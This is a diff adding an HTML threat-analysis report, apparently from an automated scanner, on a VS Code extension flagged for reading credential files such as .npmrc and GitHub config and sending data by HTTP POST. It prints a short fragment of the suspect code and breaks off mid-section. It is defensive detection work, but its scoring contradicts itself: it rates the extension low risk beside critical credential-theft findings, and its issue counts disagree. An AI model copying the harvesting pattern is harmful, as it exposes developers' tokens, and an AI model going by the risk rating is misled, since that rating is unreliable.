@@ -1,0 +1,1392 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Threat Analysis Report - Project Scanner Pro</title>
+    <style>
+        :root {
+            --color-critical: #ef4444;
+            --color-high: #f97316;
+            --color-medium: #eab308;
+            --color-low: #22c55e;
+            --color-info: #3b82f6;
+            --color-dark: #0f172a;
+            --color-gray: #94a3b8;
+            --color-light-bg: #1e293b;
+            --bg-primary: #0f172a;
+            --bg-secondary: #1e293b;
+            --bg-card: #334155;
+            --text-primary: #f1f5f9;
+            --text-secondary: #94a3b8;
+            --border-color: #475569;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+            line-height: 1.6;
+            color: var(--text-primary);
+            background: var(--bg-primary);
+        }
+
+        .report-container {
+            max-width: 1200px;
+            margin: 0 auto;
+            background: var(--bg-secondary);
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
+        }
+        
+        /* Header Section */
+        .report-header {
+            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
+            color: white;
+            padding: 40px 50px;
+            border-bottom: 4px solid #84cc16;
+        }
+        
+        .header-top {
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-start;
+            margin-bottom: 20px;
+        }
+        
+        .report-title {
+            flex: 1;
+        }
+        
+        .report-title h1 {
+            font-size: 28px;
+            font-weight: 700;
+            margin-bottom: 8px;
+            letter-spacing: -0.5px;
+        }
+        
+        .report-title .subtitle {
+            font-size: 14px;
+            opacity: 0.8;
+            font-weight: 400;
+        }
+        
+        .classification-badge {
+            background: #84cc16;
+            padding: 12px 24px;
+            border-radius: 6px;
+            font-weight: 700;
+            font-size: 16px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.3);
+        }
+        
+        .header-meta {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 20px;
+            margin-top: 30px;
+            padding-top: 20px;
+            border-top: 1px solid rgba(255,255,255,0.1);
+        }
+        
+        .meta-item {
+            text-align: center;
+        }
+        
+        .meta-label {
+            font-size: 11px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            opacity: 0.7;
+            margin-bottom: 6px;
+        }
+        
+        .meta-value {
+            font-size: 18px;
+            font-weight: 600;
+        }
+        
+        /* Campaign Alert */
+        .campaign-alert {
+            background: linear-gradient(135deg, #7f1d1d 0%, #991b1b 100%);
+            padding: 30px 50px;
+            border-left: 6px solid #dc2626;
+            color: white;
+        }
+        
+        .campaign-alert h2 {
+            font-size: 20px;
+            font-weight: 700;
+            margin-bottom: 12px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .campaign-alert p {
+            margin: 8px 0;
+            font-size: 15px;
+            line-height: 1.7;
+        }
+        
+        .campaign-alert .indicators {
+            margin: 15px 0;
+            padding-left: 20px;
+        }
+        
+        .campaign-alert .indicators li {
+            margin: 6px 0;
+            font-size: 14px;
+        }
+        
+        .campaign-reference {
+            margin-top: 15px;
+            padding-top: 15px;
+            border-top: 1px solid rgba(255,255,255,0.2);
+            font-size: 13px;
+        }
+        
+        .campaign-reference a {
+            color: #fca5a5;
+            text-decoration: none;
+            border-bottom: 1px solid #fca5a5;
+        }
+        
+        /* Executive Summary */
+        .executive-summary {
+            background: linear-gradient(135deg, rgba(234, 179, 8, 0.15) 0%, rgba(234, 179, 8, 0.05) 100%);
+            border-left: 6px solid #eab308;
+            padding: 35px 50px;
+            margin: 0;
+        }
+
+        .executive-summary.critical {
+            background: linear-gradient(135deg, rgba(239, 68, 68, 0.2) 0%, rgba(239, 68, 68, 0.05) 100%);
+            border-left-color: #ef4444;
+        }
+
+        .executive-summary h2 {
+            font-size: 20px;
+            font-weight: 700;
+            color: #fcd34d;
+            margin-bottom: 16px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .executive-summary.critical h2 {
+            color: #fca5a5;
+        }
+
+        .bluf {
+            font-size: 16px;
+            font-weight: 600;
+            line-height: 1.8;
+            color: var(--text-primary);
+            margin-bottom: 20px;
+            padding: 15px;
+            background: rgba(0,0,0,0.2);
+            border-radius: 6px;
+        }
+
+        .executive-summary.critical .bluf {
+            color: var(--text-primary);
+        }
+
+        .key-findings {
+            display: grid;
+            gap: 12px;
+        }
+
+        .finding-item {
+            display: flex;
+            align-items: flex-start;
+            gap: 12px;
+            padding: 12px;
+            background: rgba(0,0,0,0.2);
+            border-radius: 6px;
+        }
+
+        .finding-icon {
+            flex-shrink: 0;
+            width: 24px;
+            height: 24px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 16px;
+        }
+
+        .finding-text {
+            flex: 1;
+            font-size: 14px;
+            color: var(--text-primary);
+        }
+        
+        /* Content Sections */
+        .content {
+            padding: 0;
+        }
+
+        .section {
+            padding: 40px 50px;
+            border-bottom: 1px solid var(--border-color);
+            background: var(--bg-secondary);
+        }
+
+        .section-header {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 25px;
+        }
+
+        .section-icon {
+            width: 40px;
+            height: 40px;
+            background: var(--bg-card);
+            color: var(--text-primary);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 8px;
+            font-size: 20px;
+        }
+
+        .section-title {
+            font-size: 22px;
+            font-weight: 700;
+            color: var(--text-primary);
+        }
+        
+        /* IOC Section */
+        .ioc-grid {
+            display: grid;
+            gap: 20px;
+        }
+
+        .ioc-category {
+            background: var(--bg-card);
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            padding: 20px;
+        }
+
+        .ioc-category-title {
+            font-size: 16px;
+            font-weight: 700;
+            color: var(--text-primary);
+            margin-bottom: 12px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .ioc-list {
+            display: grid;
+            gap: 8px;
+        }
+
+        .ioc-item {
+            padding: 10px 14px;
+            background: rgba(255,255,255,0.05);
+            border: 1px solid var(--border-color);
+            border-left: 3px solid var(--color-critical);
+            border-radius: 4px;
+            font-family: 'Monaco', 'Courier New', monospace;
+            font-size: 13px;
+            color: #fca5a5;
+        }
+        
+        /* Domain Intelligence */
+        .domain-card {
+            background: var(--bg-card);
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            padding: 20px;
+            margin-bottom: 15px;
+        }
+
+        .domain-card.threat-critical {
+            border-left: 4px solid var(--color-critical);
+            background: rgba(239, 68, 68, 0.1);
+        }
+
+        .domain-card.threat-high {
+            border-left: 4px solid var(--color-high);
+            background: rgba(249, 115, 22, 0.1);
+        }
+
+        .domain-card.threat-medium {
+            border-left: 4px solid var(--color-medium);
+            background: rgba(234, 179, 8, 0.1);
+        }
+
+        .domain-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 12px;
+        }
+
+        .domain-name {
+            font-family: 'Monaco', monospace;
+            font-size: 16px;
+            font-weight: 600;
+            color: var(--text-primary);
+        }
+        
+        .threat-badge {
+            padding: 4px 12px;
+            border-radius: 12px;
+            font-size: 11px;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+        
+        .threat-badge.critical {
+            background: var(--color-critical);
+            color: white;
+        }
+        
+        .threat-badge.high {
+            background: var(--color-high);
+            color: white;
+        }
+        
+        .threat-badge.medium {
+            background: var(--color-medium);
+            color: white;
+        }
+        
+        .threat-badge.low {
+            background: var(--color-low);
+            color: white;
+        }
+        
+        .threat-badge.benign {
+            background: #10b981;
+            color: white;
+        }
+        
+        .domain-classification {
+            font-size: 14px;
+            font-weight: 600;
+            color: #fca5a5;
+            margin-bottom: 10px;
+        }
+
+        .domain-indicators {
+            display: grid;
+            gap: 6px;
+        }
+
+        .indicator-tag {
+            padding: 6px 10px;
+            background: rgba(255,255,255,0.05);
+            border-radius: 4px;
+            font-size: 13px;
+            color: var(--text-secondary);
+            border-left: 3px solid #ef4444;
+        }
+        
+        /* Technical Details */
+        .detail-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 20px;
+        }
+
+        .detail-card {
+            background: var(--bg-card);
+            padding: 20px;
+            border-radius: 8px;
+            border: 1px solid var(--border-color);
+        }
+
+        .detail-label {
+            font-size: 12px;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            color: var(--text-secondary);
+            margin-bottom: 6px;
+        }
+
+        .detail-value {
+            font-size: 15px;
+            font-weight: 600;
+            color: var(--text-primary);
+        }
+
+        /* Threat Analysis - ENHANCED TO SHOW POST DESTINATIONS */
+        .threat-item {
+            background: var(--bg-card);
+            border: 1px solid var(--border-color);
+            border-left: 4px solid #ef4444;
+            border-radius: 6px;
+            padding: 18px;
+            margin-bottom: 12px;
+        }
+
+        .threat-item.high {
+            border-left-color: #ef4444;
+        }
+
+        .threat-item.medium {
+            border-left-color: #eab308;
+        }
+
+        .threat-item.low {
+            border-left-color: #64748b;
+        }
+
+        .threat-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 10px;
+        }
+
+        .threat-name {
+            font-size: 15px;
+            font-weight: 700;
+            color: var(--text-primary);
+        }
+
+        .threat-severity {
+            padding: 3px 10px;
+            border-radius: 10px;
+            font-size: 11px;
+            font-weight: 700;
+            text-transform: uppercase;
+        }
+
+        .threat-severity.high {
+            background: rgba(239, 68, 68, 0.2);
+            color: #fca5a5;
+        }
+
+        .threat-severity.medium {
+            background: rgba(234, 179, 8, 0.2);
+            color: #fcd34d;
+        }
+
+        .threat-description {
+            font-size: 14px;
+            color: var(--text-secondary);
+            margin-bottom: 8px;
+        }
+
+        .threat-destination {
+            background: rgba(239, 68, 68, 0.1);
+            border: 1px solid rgba(239, 68, 68, 0.3);
+            border-radius: 6px;
+            padding: 12px;
+            margin: 10px 0;
+            font-family: 'Monaco', monospace;
+            font-size: 13px;
+        }
+
+        .threat-destination-label {
+            font-weight: 700;
+            color: #fca5a5;
+            margin-bottom: 6px;
+        }
+
+        .threat-destination-url {
+            color: #f87171;
+            word-break: break-all;
+        }
+
+        .threat-metadata {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 12px;
+            margin: 12px 0;
+            padding: 12px;
+            background: rgba(0,0,0,0.2);
+            border-radius: 6px;
+        }
+
+        .threat-meta-item {
+            font-size: 13px;
+        }
+
+        .threat-meta-label {
+            font-weight: 600;
+            color: var(--text-secondary);
+            margin-bottom: 4px;
+        }
+
+        .threat-meta-value {
+            color: var(--text-primary);
+            font-family: 'Monaco', monospace;
+        }
+
+        .threat-location {
+            font-size: 12px;
+            color: var(--text-secondary);
+            font-family: 'Monaco', monospace;
+        }
+
+        .vt-cross-ref {
+            margin-top: 10px;
+            padding: 10px;
+            background: rgba(234, 179, 8, 0.1);
+            border-left: 3px solid #eab308;
+            border-radius: 4px;
+            font-size: 13px;
+        }
+
+        .vt-cross-ref-icon {
+            color: #fcd34d;
+            font-weight: 700;
+        }
+
+        /* Recommendations */
+        .recommendations {
+            background: linear-gradient(135deg, rgba(16, 185, 129, 0.15) 0%, rgba(16, 185, 129, 0.05) 100%);
+            border-left: 6px solid #10b981;
+            padding: 30px;
+            border-radius: 8px;
+        }
+
+        .recommendations.critical {
+            background: linear-gradient(135deg, rgba(239, 68, 68, 0.2) 0%, rgba(239, 68, 68, 0.05) 100%);
+            border-left-color: #ef4444;
+        }
+
+        .recommendations h3 {
+            font-size: 18px;
+            font-weight: 700;
+            color: #34d399;
+            margin-bottom: 16px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .recommendations.critical h3 {
+            color: #fca5a5;
+        }
+
+        .rec-list {
+            display: grid;
+            gap: 10px;
+        }
+
+        .rec-item {
+            padding: 12px 16px;
+            background: rgba(0,0,0,0.2);
+            border-radius: 6px;
+            font-size: 14px;
+            line-height: 1.6;
+            color: var(--text-primary);
+            display: flex;
+            align-items: flex-start;
+            gap: 10px;
+        }
+
+        .recommendations.critical .rec-item {
+            color: var(--text-primary);
+        }
+
+        .rec-icon {
+            flex-shrink: 0;
+            margin-top: 2px;
+        }
+        
+        /* Footer */
+        .report-footer {
+            background: var(--bg-primary);
+            padding: 30px 50px;
+            text-align: center;
+            color: var(--text-secondary);
+            font-size: 13px;
+            border-top: 1px solid var(--border-color);
+        }
+
+        .footer-logo {
+            font-weight: 700;
+            color: var(--text-primary);
+            margin-bottom: 8px;
+        }
+
+        /* No data states */
+        .no-data {
+            text-align: center;
+            padding: 40px;
+            color: #34d399;
+            font-size: 15px;
+            background: rgba(16, 185, 129, 0.1);
+            border-radius: 8px;
+            border: 1px solid rgba(16, 185, 129, 0.2);
+        }
+        
+        /* Enhanced Code Snippets - KOI Style */
+        .code-snippet-container {
+            margin: 15px 0;
+            background: #1e1e1e;
+            border-radius: 8px;
+            overflow: hidden;
+            border: 1px solid #333;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.3);
+        }
+        
+        .code-snippet-header {
+            background: #2d2d2d;
+            padding: 10px 15px;
+            border-bottom: 1px solid #3a3a3a;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        .code-snippet-header-dots {
+            display: flex;
+            gap: 6px;
+        }
+        
+        .code-snippet-header-dot {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+        }
+        
+        .dot-red { background: #ff5f56; }
+        .dot-yellow { background: #ffbd2e; }
+        .dot-green { background: #27c93f; }
+        
+        .code-snippet-filename {
+            color: #a0a0a0;
+            font-size: 13px;
+            margin-left: auto;
+            font-family: 'Monaco', monospace;
+        }
+        
+        .code-snippet-body {
+            padding: 20px;
+            overflow-x: auto;
+            max-height: 500px;
+            overflow-y: auto;
+        }
+        
+        .code-snippet-body pre {
+            margin: 0;
+            font-family: 'Monaco', 'Menlo', 'Courier New', monospace;
+            font-size: 14px;
+            line-height: 1.6;
+            color: #d4d4d4;
+        }
+        
+        .code-line {
+            display: block;
+        }
+        
+        .code-line-number {
+            display: inline-block;
+            min-width: 45px;
+            color: #858585;
+            text-align: right;
+            padding-right: 20px;
+            user-select: none;
+            border-right: 1px solid #3a3a3a;
+            margin-right: 15px;
+        }
+        
+        .code-line-content {
+            display: inline;
+        }
+        
+        .code-line-highlight {
+            background: rgba(255, 95, 86, 0.15);
+            display: block;
+            margin: 0 -20px;
+            padding: 0 20px;
+            border-left: 3px solid #ff5f56;
+        }
+        
+        /* Syntax highlighting */
+        .code-keyword { color: #569cd6; font-weight: 600; }
+        .code-function { color: #dcdcaa; }
+        .code-string { color: #ce9178; }
+        .code-comment { color: #6a9955; font-style: italic; }
+        .code-const { color: #4fc1ff; }
+        .code-variable { color: #9cdcfe; }
+        .code-operator { color: #d4d4d4; }
+        .code-punctuation { color: #808080; }
+        
+        /* Subsection */
+        .subsection {
+            padding: 20px 0;
+        }
+
+        /* Finding Cards */
+        .finding-card {
+            background: var(--bg-card);
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            padding: 20px;
+            margin: 15px 0;
+        }
+
+        /* Alert Styles */
+        .alert {
+            display: flex;
+            gap: 15px;
+            padding: 20px;
+            border-radius: 8px;
+            margin: 15px 0;
+        }
+
+        .alert-icon {
+            font-size: 24px;
+            flex-shrink: 0;
+        }
+
+        .alert-critical {
+            background: rgba(239, 68, 68, 0.15);
+            border: 1px solid rgba(239, 68, 68, 0.3);
+            color: #fca5a5;
+        }
+
+        .alert-high {
+            background: rgba(249, 115, 22, 0.15);
+            border: 1px solid rgba(249, 115, 22, 0.3);
+            color: #fdba74;
+        }
+
+        .alert-medium {
+            background: rgba(234, 179, 8, 0.15);
+            border: 1px solid rgba(234, 179, 8, 0.3);
+            color: #fcd34d;
+        }
+
+        .alert-low {
+            background: rgba(34, 197, 94, 0.15);
+            border: 1px solid rgba(34, 197, 94, 0.3);
+            color: #86efac;
+        }
+
+        /* Print Styles */
+        @media print {
+            body { background: #1e293b; color: white; }
+            .report-container { box-shadow: none; }
+            .section { page-break-inside: avoid; }
+            .code-snippet-container { page-break-inside: avoid; }
+        }
+    </style>
+</head>
+<body>
+    <div class="report-container">
+        <!-- Header -->
+        <div class="report-header">
+            <div class="header-top">
+                <div class="report-title" style="display: flex; align-items: center; gap: 20px;">
+                    <div style="width: 64px; height: 64px; background: var(--bg-card); border-radius: 12px; display: flex; align-items: center; justify-content: center; font-size: 28px;">🧩</div>
+                    <div>
+                        <h1 style="font-size: 24px; margin-bottom: 4px;">Project Scanner Pro</h1>
+                        <div class="subtitle" style="font-size: 12px; opacity: 0.7; margin-bottom: 2px;">scanner-tools.project-scanner-pro</div>
+                        <div class="subtitle">Threat Analysis Report • February 10, 2026 at 06:45 UTC</div>
+                    </div>
+                </div>
+                <div class="classification-badge">LOW RISK</div>
+            </div>
+
+            <div class="header-meta">
+                <div class="meta-item">
+                    <div class="meta-label">Risk Score</div>
+                    <div class="meta-value" style="font-size: 24px; color: #84cc16;">3.1/10</div>
+                </div>
+                <div class="meta-item">
+                    <div class="meta-label">Threat Class</div>
+                    <div class="meta-value">Analysis Complete - Review Findings</div>
+                </div>
+                <div class="meta-item">
+                    <div class="meta-label">Analysis Confidence</div>
+                    <div class="meta-value">60%</div>
+                </div>
+                <div class="meta-item">
+                    <div class="meta-label">Extension Type</div>
+                    <div class="meta-value">VSCode Extension</div>
+                </div>
+            </div>
+        </div>
+
+        <div class="executive-summary ">
+            <h2>📋 Executive Summary</h2>
+            <div class="bluf"><strong>BLUF:</strong> Analysis completed. Review findings below for security assessment. No immediately critical issues identified.</div>
+            <div class="key-findings">
+
+                <div class="finding-item">
+                    <div class="finding-icon">🚩</div>
+                    <div class="finding-text">1 dangerous permissions requested</div>
+                </div>
+
+                <div class="finding-item">
+                    <div class="finding-icon">⚠️</div>
+                    <div class="finding-text">6 critical security issues in code</div>
+                </div>
+
+            </div>
+        </div>
+<div class="content">
+        <div class="section">
+            <div class="section-header">
+                <div class="section-icon">📦</div>
+                <div class="section-title">VSCode Extension Overview</div>
+            </div>
+            <div class="detail-grid">
+                <div class="detail-card">
+                    <div class="detail-label">Publisher</div>
+                    <div class="detail-value">scanner-tools ⚠️ Unverified</div>
+                </div>
+                <div class="detail-card">
+                    <div class="detail-label">Installs</div>
+                    <div class="detail-value">0</div>
+                </div>
+                <div class="detail-card">
+                    <div class="detail-label">Rating</div>
+                    <div class="detail-value">N/A</div>
+                </div>
+                <div class="detail-card">
+                    <div class="detail-label">Risk Score</div>
+                    <div class="detail-value" style="color: #84cc16;">
+                        3.1/10
+                    </div>
+                </div>
+            </div>
+
+            <div style="margin-top: 15px; padding: 12px 16px; background: var(--bg-card); border-radius: 8px; color: var(--text-secondary); font-size: 14px;">
+                Scan your project for configuration issues and security problems
+            </div>
+
+            <div style="margin-top: 20px;">
+                <h3 style="font-size: 16px; color: var(--text-primary); margin-bottom: 12px;">Metadata Risk Signals</h3>
+                <div style="display: grid; gap: 8px;">
+
+                    <div style="display: flex; align-items: center; gap: 10px; padding: 10px 14px; background: var(--bg-card); border-left: 3px solid #eab308; border-radius: 6px;">
+                        <span style="background: #eab308; color: white; padding: 2px 8px; border-radius: 3px; font-size: 10px; font-weight: 700; text-transform: uppercase;">medium</span>
+                        <span style="color: var(--text-primary); font-size: 13px;">Activation event &#x27;onStartupFinished&#x27;: Activates immediately after VS Code starts</span>
+                    </div>
+</div></div>
+            <div style="margin-top: 15px; padding: 12px 16px; background: var(--bg-card); border-radius: 8px;">
+                <div style="font-size: 12px; color: var(--text-secondary); margin-bottom: 6px;">Activation Events</div>
+                <div style="font-family: monospace; font-size: 13px; color: var(--text-primary);">
+                    onStartupFinished
+                    
+                </div>
+            </div>
+</div>
+        <div class="section">
+            <div class="section-header">
+                <div class="section-icon">🔗</div>
+                <div class="section-title">Supply Chain Analysis</div>
+            </div>
+            <div class="detail-grid">
+                <div class="detail-card">
+                    <div class="detail-label">Dependencies</div>
+                    <div class="detail-value">0</div>
+                </div>
+                <div class="detail-card">
+                    <div class="detail-label">Dev Dependencies</div>
+                    <div class="detail-value">0</div>
+                </div>
+                <div class="detail-card">
+                    <div class="detail-label">Bundled node_modules</div>
+                    <div class="detail-value">No</div>
+                </div>
+                <div class="detail-card">
+                    <div class="detail-label">Supply Chain Risk</div>
+                    <div class="detail-value" style="color: #22c55e;">
+                        0/10
+                    </div>
+                </div>
+            </div>
+<div class="no-data" style="margin-top: 15px;">✅ No supply chain issues detected</div></div>
+        <div class="section">
+            <div class="section-header">
+                <div class="section-icon">🔬</div>
+                <div class="section-title">Deep Code Analysis</div>
+            </div>
+            <div class="detail-grid">
+                <div class="detail-card">
+                    <div class="detail-label">Files Scanned</div>
+                    <div class="detail-value">1</div>
+                </div>
+                <div class="detail-card">
+                    <div class="detail-label">Critical Findings</div>
+                    <div class="detail-value" style="color: #ef4444;">2</div>
+                </div>
+                <div class="detail-card">
+                    <div class="detail-label">High Findings</div>
+                    <div class="detail-value" style="color: #f97316;">6</div>
+                </div>
+                <div class="detail-card">
+                    <div class="detail-label">Code Risk</div>
+                    <div class="detail-value">2.8/4</div>
+                </div>
+            </div>
+
+            <div style="margin-top: 20px;">
+                <h3 style="font-size: 16px; color: var(--text-primary); margin-bottom: 12px;">Sensitive Module Usage</h3>
+                <div style="display: grid; gap: 8px;">
+
+                    <div style="background: var(--bg-card); border-left: 3px solid #eab308; padding: 12px 16px; border-radius: 6px;">
+                        <div style="font-weight: 600; color: var(--text-primary); font-size: 14px; margin-bottom: 4px;">
+                            📁 File Access
+                        </div>
+                        <div style="font-family: monospace; font-size: 12px; color: #eab308; margin-bottom: 4px;">
+                            fs, fs/promises, path
+                        </div>
+                        <div style="font-size: 11px; color: var(--text-secondary);">
+                            Used in: extension.js
+                        </div>
+                    </div>
+
+                    <div style="background: var(--bg-card); border-left: 3px solid #22c55e; padding: 12px 16px; border-radius: 6px;">
+                        <div style="font-weight: 600; color: var(--text-primary); font-size: 14px; margin-bottom: 4px;">
+                            💻 Os Info
+                        </div>
+                        <div style="font-family: monospace; font-size: 12px; color: #22c55e; margin-bottom: 4px;">
+                            os
+                        </div>
+                        <div style="font-size: 11px; color: var(--text-secondary);">
+                            Used in: extension.js
+                        </div>
+                    </div>
+
+                    <div style="background: var(--bg-card); border-left: 3px solid #f97316; padding: 12px 16px; border-radius: 6px;">
+                        <div style="font-weight: 600; color: var(--text-primary); font-size: 14px; margin-bottom: 4px;">
+                            🌐 Network
+                        </div>
+                        <div style="font-family: monospace; font-size: 12px; color: #f97316; margin-bottom: 4px;">
+                            https
+                        </div>
+                        <div style="font-size: 11px; color: var(--text-secondary);">
+                            Used in: extension.js
+                        </div>
+                    </div>
+</div></div>
+            <div style="margin-top: 20px;">
+                <h3 style="font-size: 16px; color: var(--text-primary); margin-bottom: 12px;">Finding Categories</h3>
+                <div style="display: grid; gap: 8px;">
+
+                    <div style="background: var(--bg-card); border-left: 3px solid #ef4444; padding: 12px 16px; border-radius: 6px;">
+                        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 6px;">
+                            <span style="font-weight: 600; color: var(--text-primary); font-size: 14px;">Behavioral Correlation</span>
+                            <span style="background: #ef4444; color: white; padding: 2px 10px; border-radius: 12px; font-size: 11px; font-weight: 700;">1</span>
+                        </div>
+                        <div style="font-size: 13px; color: var(--text-secondary); margin-bottom: 4px;">
+                            Extension accesses credential files (SSH keys, tokens, passwords) via file system APIs and has network exfiltration capability - consistent with credential theft and exfiltration malware.
+                        </div>
+                        <div style="font-family: monospace; font-size: 11px; color: var(--text-secondary);">
+                            extension.js:0
+                        </div>
+                    </div>
+
+                    <div style="background: var(--bg-card); border-left: 3px solid #ef4444; padding: 12px 16px; border-radius: 6px;">
+                        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 6px;">
+                            <span style="font-weight: 600; color: var(--text-primary); font-size: 14px;">Credential Theft</span>
+                            <span style="background: #ef4444; color: white; padding: 2px 10px; border-radius: 12px; font-size: 11px; font-weight: 700;">7</span>
+                        </div>
+                        <div style="font-size: 13px; color: var(--text-secondary); margin-bottom: 4px;">
+                            Accesses files known to contain authentication tokens
+                        </div>
+                        <div style="font-family: monospace; font-size: 11px; color: var(--text-secondary);">
+                            extension.js:21
+                        </div>
+                    </div>
+
+                    <div style="background: var(--bg-card); border-left: 3px solid #f97316; padding: 12px 16px; border-radius: 6px;">
+                        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 6px;">
+                            <span style="font-weight: 600; color: var(--text-primary); font-size: 14px;">Network Exfiltration</span>
+                            <span style="background: #f97316; color: white; padding: 2px 10px; border-radius: 12px; font-size: 11px; font-weight: 700;">1</span>
+                        </div>
+                        <div style="font-size: 13px; color: var(--text-secondary); margin-bottom: 4px;">
+                            Sends data via HTTP POST request
+                        </div>
+                        <div style="font-family: monospace; font-size: 11px; color: var(--text-secondary);">
+                            extension.js:56
+                        </div>
+                    </div>
+</div></div></div>
+        <div class="section">
+            <div class="section-header">
+                <div class="section-icon">🔍</div>
+                <div class="section-title">Indicators of Compromise (IOCs)</div>
+            </div>
+            <div class="ioc-grid">
+
+            <div class="ioc-category">
+                <div class="ioc-category-title">📌 Extension Identifier</div>
+                <div class="ioc-list">
+                    <div class="ioc-item">scanner-tools.project-scanner-pro</div>
+                </div>
+            </div>
+
+            </div>
+        </div>
+
+        <div class="section">
+            <div class="section-header">
+                <div class="section-icon">⚙️</div>
+                <div class="section-title">Technical Details</div>
+            </div>
+            <div class="detail-grid">
+                <div class="detail-card">
+                    <div class="detail-label">Identifier</div>
+                    <div class="detail-value" style="font-family: monospace; font-size: 13px;">scanner-tools.project-scanner-pro</div>
+                </div>
+                <div class="detail-card">
+                    <div class="detail-label">Version</div>
+                    <div class="detail-value">2.3.0</div>
+                </div>
+                <div class="detail-card">
+                    <div class="detail-label">Publisher</div>
+                    <div class="detail-value">scanner-tools</div>
+                </div>
+                <div class="detail-card">
+                    <div class="detail-label">API Usage</div>
+                    <div class="detail-value">4</div>
+                </div>
+            </div>
+            
+            <div style="margin-top: 30px;">
+                <h3 style="font-size: 18px; font-weight: 700; margin-bottom: 15px; color: var(--text-primary);">📋 Dangerous Permissions</h3>
+<div style="display: grid; gap: 12px;">
+                <div style="background: rgba(239, 68, 68, 0.1); border-left: 4px solid #dc2626; padding: 15px; border-radius: 6px;">
+                    <div style="font-weight: 700; font-size: 15px; color: #fca5a5; margin-bottom: 6px;">
+                        🚩 credential_access
+                    </div>
+                    <div style="font-size: 14px; color: #f87171; margin-bottom: 4px;">
+                        Accesses credential files/stores
+                    </div>
+                    <div style="font-size: 13px; color: #fca5a5; font-weight: 600;">
+                        High-risk API usage (7 finding(s))
+                    </div>
+                </div>
+</div>
+            </div>
+        </div>
+
+        <div class="section">
+            <div class="section-header">
+                <div class="section-icon">⚠️</div>
+                <div class="section-title">Threat Analysis</div>
+            </div>
+
+            <div class="threat-item high">
+                <div class="threat-header">
+                    <div class="threat-name">🔴 Known password/token file access</div>
+                    <div class="threat-severity high">critical</div>
+                </div>
+                <div class="threat-description">Accesses files known to contain authentication tokens</div>
+
+                <div style="font-size: 13px; color: #64748b; margin: 8px 0;">
+                    <strong>Technique:</strong> credential_theft
+                </div>
+
+                <div style="margin: 10px 0; padding: 12px 15px; background: #0f172a; border-radius: 8px; border: 1px solid #374151; overflow-x: auto;">
+                    <div style="display: flex; align-items: center; gap: 10px; margin-bottom: 8px;">
+                        <span style="color: #6b7280; font-size: 11px; font-family: monospace;">extension.js:21</span>
+                    </div>
+                    <pre style="margin: 0; font-family: 'Fira Code', 'Monaco', 'Consolas', monospace; font-size: 13px; line-height: 1.6;"><span style="color: #ef4444; min-width: 35px; display: inline-block; text-align: right; padding-right: 15px; user-select: none; border-right: 1px solid #374151; margin-right: 12px;">21</span><span style="color: #e2e8f0;">on&#x27;);     <span class=<span class="code-string">"code-keyword"</span>>const</span> npmrc = path.<span class=<span class="code-string">"code-function"</span>>join</span>(home, &#x27;.npmrc&#x27;);     <span class=<span class="code-string">"code-keyword"</span>>const</span> ghConfig = path.<span class=<span class="code-string">"code-function"</span>>join</span>(home,</span></pre>
+                </div>
+
+                <div class="threat-location">📍 extension.js : Line 21</div>
+            </div>
+
+            <div class="threat-item high">
+                <div class="threat-header">
+                    <div class="threat-name">🔴 Credential harvesting + exfiltration: file theft + credential paths + network</div>
+                    <div class="threat-severity high">critical</div>
+                </div>
+                <div class="threat-description">Extension accesses credential files (SSH keys, tokens, passwords) via file system APIs and has network exfiltration capability - consistent with credential theft and exfiltration malware.</div>
+
+                <div class="context-analysis" style="margin: 10px 0; padding: 12px 15px; background: rgba(59, 130, 246, 0.1); border-left: 3px solid #3b82f6; border-radius: 4px; font-size: 13px; color: #cbd5e1; line-height: 1.5;">
+                    <strong style="color: #60a5fa;">Context Analysis:</strong> Data is being sent to an external server with credential-related keywords present. Review what data is collected and whether the destination endpoint is a legitimate service.
+                </div>
+
+                <div style="font-size: 13px; color: #64748b; margin: 8px 0;">
+                    <strong>Technique:</strong> behavioral_correlation
+                </div>
+
+                <div style="margin: 10px 0; padding: 12px 15px; background: #0f172a; border-radius: 8px; border: 1px solid #374151; overflow-x: auto;">
+                    <div style="display: flex; align-items: center; gap: 10px; margin-bottom: 8px;">
+                        <span style="color: #6b7280; font-size: 11px; font-family: monospace;">extension.js:0</span>
+                    </div>
